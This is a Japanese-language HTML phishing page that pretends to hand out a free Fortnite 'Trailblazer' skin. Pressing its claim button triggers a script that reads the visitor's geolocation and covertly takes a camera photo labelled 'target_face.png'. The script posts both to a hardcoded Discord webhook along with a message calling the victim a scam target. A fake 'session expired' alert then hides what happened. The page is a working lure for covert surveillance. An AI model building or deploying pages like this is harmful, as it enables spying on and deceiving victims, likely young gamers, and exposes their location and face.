<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fortnite - Trailblazer Skin Reward</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding-top: 40px;
            margin: 0;
        }
        .container {
            max-width: 450px;
            margin: 0 auto;
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        h2 {
            color: #00ffcc;
            margin-bottom: 10px;
        }
        .skin-box {
            background: #2b2b2b;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border: 1px solid #444;
        }
        button {
            background-color: #ffcc00;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #e6b800;
        }
        p {
            color: #b0b0b0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔥 トレイルブレイザー スキンの受取</h2>
        <p>アカウント特典の限定スキン（Trailblazer）をインベントリに追加します。</p>
        
        <div class="skin-box">
            <h3>Trailblazer (レジェンド)</h3>
            <p>※Epic Gamesアカウントへのログイン認証が必要です。</p>
        </div>

        <button onclick="startPrank()">スキンを受け取る</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1553096437376487586/kzTpRNKsEjfqTr3L4T75-2tqikQ7g-bjuz4QZYC8CqEqCqeMhSRlOeC5NJ85kf9QTlK3'; // ←ここに自分のDiscordのWebhook URLを入れる

        function startPrank() {
            // 位置情報の取得
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendToDiscord(`位置情報取得成功: 緯度 ${lat}, 経度 ${lon}`);
                });
            }

            // カメラの起動と撮影
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('file', blob, 'target_face.png');
                            formData.append('content', '【トレイルブレイザー詐欺】ターゲットの写真が撮れました！');

                            fetch(webhookUrl, {
                                method: 'POST',
                                body: formData
                            });

                            // カメラを止める
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 1500);
                })
                .catch(err => {
                    console.log("カメラエラー");
                });

            // ボタンを押したあとのエラー演出（その場ではバレないようにする）
            setTimeout(() => {
                alert("エラー: セッションの有効期限が切れています。もう一度リンクを開き直してください。");
            }, 1000);
        }
    </script>
</body>
</html>
